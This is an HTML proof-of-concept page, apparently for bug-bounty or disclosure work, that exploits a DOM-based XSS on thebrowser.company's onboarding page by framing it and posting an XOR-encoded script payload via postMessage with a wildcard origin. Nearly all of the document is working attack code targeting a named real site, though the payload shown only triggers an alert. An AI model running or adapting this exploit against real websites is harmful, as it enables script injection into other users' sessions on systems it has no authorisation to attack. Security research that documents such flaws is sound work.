<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ðŸ’¥ Final XSS PoC â€“ thebrowser.company</title>
  <style>
    body { background: #111; color: #0f0; font-family: monospace; padding: 1rem; }
    iframe { width: 100%; height: 600px; border: 2px solid #0f0; margin-top: 1rem; }
  </style>
</head>
<body>

<h2>âœ… Final XSS PoC â€“ DOM XSS via postMessage (XOR)</h2>
<div id="status">ðŸ“¡ Waiting for iframe to load...</div>

<iframe id="target" src="https://thebrowser.company/onboarding" sandbox="allow-scripts allow-same-origin"></iframe>

<script>
  // XOR encoder matching the site's decryption logic
  function xorEncode(str, key = 0x66) {
    const keyHex = key.toString(16).padStart(2, '0');
    const encoded = Array.from(str).map(c => {
      return (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0');
    }).join('');
    return keyHex + encoded;
  }

  const payload = "<script>alert('XSS: thebrowser.company')</script>";
  const encoded = xorEncode(payload);

  const iframe = document.getElementById("target");

  iframe.onload = () => {
    document.getElementById("status").textContent = "âœ… iframe loaded";

    // Send payload via postMessage
    setTimeout(() => {
      iframe.contentWindow.postMessage(encoded, "*");
      console.log("ðŸš€ XOR payload sent:", encoded);
    }, 1000);
  };
</script>

</body>
</html>
